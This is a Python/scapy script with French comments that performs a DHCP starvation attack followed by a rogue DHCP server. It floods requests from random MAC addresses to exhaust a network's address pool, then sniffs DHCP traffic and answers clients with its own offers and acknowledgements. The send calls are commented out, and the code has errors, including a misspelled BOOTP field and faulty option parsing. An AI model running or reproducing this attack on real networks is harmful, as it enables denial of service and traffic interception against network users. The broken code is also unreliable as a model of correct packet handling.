from scapy.all import *
from time import sleep
import os

ipServer = "169.254.96.5"
listeIp = {}

#---- CONSTRUIRE LA TRAME DISCOVER ----

def build_discover_packet():
    pkt = Ether(src=RandMAC(), dst="ff:ff:ff:ff:ff:ff")
    pkt /= IP(src="0.0.0.0", dst="255.255.255.255")
    pkt /= UDP(sport=68, dport=67)
    pkt /= DHCP(options=[("message-type", "discover"),
                         "end"])
    return pkt

#---- CONSTRUIRE LA TRAME DE DEMANDE D'IP ----

def build_request_packet(ipRequested):
    pkt = Ether(src=RandMAC(), dst="ff:ff:ff:ff:ff:ff")
    pkt /= IP(src="0.0.0.0", dst="255.255.255.255")
    pkt /= UDP(sport=68, dport=67)
    pkt /= DHCP(options=[("message-type", "request"),
                         ("requested_addr", ipRequested),
                         ("server_id", ipServer),
                         "end"])
    return pkt

#---- CONSTRUIRE LA TRAME D'OFFRE D'IP ----

def build_offer_packet(macDst, ipDst):
    pkt = Ether(dst=macDst)
    pkt /= IP(src=ipServer, dst=ipDst)
    pkt /= UDP(sport=67, dport=68)
    pkt /= BOOTP(op=2, yiaddr=ipDst, siaddr=ipServer)
    pkt /= DHCP(options=[("message-type", "offer"),
                         ("server_id", ipServer),
                         ("subnet_mask", "255.255.0.0"),
                         "end"])
    return pkt

#---- CONSTRUIRE LA TRAME ACK ----

def build_ack_packet(macDst, ipDst):
    pkt = Ether(dst=macDst)
    pkt /= IP(src=ipServer, dst=ipDst)
    pkt /= UDP(sport=67, dport=68)
    pkt /= BOOTP(op=2, yiaddre=ipDst, siaddr=ipServer)
    pkt /= DHCP(options=[("message-type", "ack"),
                        ("server_id", ipServer),
                        "end"])
    return pkt

#---- RESERVER TOUTES LES IP SUR UNE PLAGE D'ADRESSE ----

def ask_all_ip_in_range(ipMin, ipMax):
    i = ipMin
    while(i < ipMax):
        pkt = build_request_packet("169.254.0."+str(i))
        pkt.show()
        #sendp(pkt)
        i += 1
        sleep(0.2)

#---- PROPOSER UNE IP ----

def offer_ip(macDst, ipDst):
    pkt = build_offer_packet(macDst, ipDst)
    pkt.show()
    #sendp(pkt)

#---- CONFIRMER L'IP ----

def ack_ip(macDst, ipDst):
    if ipDst not in listeIp or macDst in listeIp.keys():
        pkt = build_ack_packet(macDst, ipDst)
        listeIp[macDst] = ipDst
        pkt.show()
        #sendp(pkt)

#---- EXTRACTION DES INFORMATIONS UTILES ----

def extract_dhcp_request(p):
    p.show()
    ip = p['IP'].src
    mac = p['Ethernet'].src
    
    #3: request, 1: discover
    if p['DHCP options'].options[0][1] == 1:
        offer_ip(mac, ip)
    elif p['DHCP options'].options[0][1] == 3:
        ipRequested = p['DHCP options'].options["requested_addr"]
        ack_ip(mac, ipRequested)

#---- PROGRAMME PRINCIPAL ----
        
def main():
    #Première étape : occuper toutes les adresses ip disponibles
    ask_all_ip_in_range(100, 102)
    #Seconde étape : détecter les paquets dhcp et attribuer des ip
    rep = sniff(filter="udp and (port 67 or port 68)", prn=extract_dhcp_request, timeout=60)

main()
os.system("pause")
